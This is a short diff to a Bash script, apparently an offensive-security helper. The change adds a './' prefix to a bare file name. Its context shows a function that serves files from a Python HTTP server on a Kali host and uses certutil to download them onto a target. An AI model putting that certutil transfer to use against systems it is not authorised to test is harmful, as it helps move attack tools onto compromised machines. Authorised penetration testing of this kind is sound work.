@@ -64,4 +64,9 @@ cmd_upload_file() {
     start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"
 
     certutil_download "http://${KALI_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
+
+    # if location is without path add ./ prefix
+    if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
+        FILE_LOCATION="./${FILE_LOCATION}"
+    fi
 }
